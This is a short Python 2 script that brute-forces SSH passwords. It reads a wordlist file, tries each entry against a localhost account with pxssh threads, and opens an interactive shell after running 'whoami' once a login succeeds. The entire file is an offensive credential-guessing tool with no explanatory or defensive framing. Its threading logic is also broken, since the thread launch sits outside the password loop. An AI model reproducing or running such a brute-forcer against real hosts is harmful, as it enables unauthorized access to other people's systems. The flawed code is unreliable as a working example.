from pexpect import pxssh
import time
from threading import *
maxcon=5
conn_lock=BoundedSemaphore(value=maxcon)
Found=False
Fails=0
def sendc(s,cmd):
    s.sendline(cmd)
    s.prompt()
    print s.before
def conn(host,user,password):
     try:  
         s=pxssh.pxssh()
         s.login(host,user,password)
         print 'Found one!'
         return s
     except:
       print 'Error password not found!'
       exit(0)

def connect(host,user,password,release):
    global Found
    global Fails
    try:
        s=pxssh.pxssh()
        s.login(host,user,password)
        print 'Magic done:'+password
        Found =True
    except Exception,e :
       if 'read_nonblocking' in str(e):
          Fails+=1
          time.sleep(5)
          connect(host,user,password,False)
       elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host,user,password,False)
    finally:
        if release: conn_lock.release()
def main():
  host='127.0.0.1'
  user='wh1z'
  passfile='pass.txt'
  fn=open(passfile,'r')
  for line in fn.readlines():
     if Found:
       print 'found !'
       exit(0)
     if Fails>5:
       print 'sock timeout'
       exit(0)
     conn_lock.acquire()
     password=line.strip('\r').strip('\n')
     print 'testing' +password
  t=Thread(target=connect,args=(host,user,password,True ))
  child=t.start()
  s=conn(host,user,password)
  sendc(s,'whoami')
  s.interact() 
if __name__ =='__main__':
  main()
